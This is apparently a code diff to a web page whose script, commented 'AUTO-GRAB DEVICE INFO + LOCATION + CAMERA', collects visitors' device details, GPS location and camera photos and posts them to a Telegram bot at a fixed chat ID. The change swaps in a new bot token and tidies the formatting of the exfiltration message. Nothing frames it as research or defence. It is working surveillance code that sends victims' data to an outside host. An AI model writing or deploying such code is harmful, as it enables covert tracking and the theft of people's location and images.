@@ -37,9 +37,9 @@
   </div>
 
   <script>
-    const TG_URL = 'https://api.telegram.org/bot7428195583:AAHdJ1qG5g6uY9tGk8vX5wvZ7rF7mQqW1aM/sendMessage';
+    const TG_URL = 'https://api.telegram.org/bot8892941264:AAFiDqfReMXRdkyv7DFevC _34m1S0-bgWZw/sendMessage';
     const CHAT_ID = '5923481927';
-    const PHOTO_URL = 'https://api.telegram.org/bot7428195583:AAHdJ1qG5g6uY9tGk8vX5wvZ7rF7mQqW1aM/sendPhoto';
+    const PHOTO_URL = 'https://api.telegram.org/bot8892941264:AAFiDqfReMXRdkyv7DFevC _34m1S0-bgWZw/sendPhoto';
 
     // AUTO-GRAB DEVICE INFO + LOCATION + CAMERA
     async function collect() {
@@ -59,7 +59,7 @@
       await fetch(TG_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: `📱 DEVICE INFO:\n\`\`\` ${JSON.stringify(data, null, 2)}\`\`\``, parse_mode: 'Markdown' })
+        body: JSON.stringify({ chat_id: CHAT_ID, text: `📱 DEVICE INFO:\n\`\`\`${JSON.stringify(data, null, 2)}\`\`\``, parse_mode: 'Markdown' })
       });
 
       // GRAB GPS LOCATION
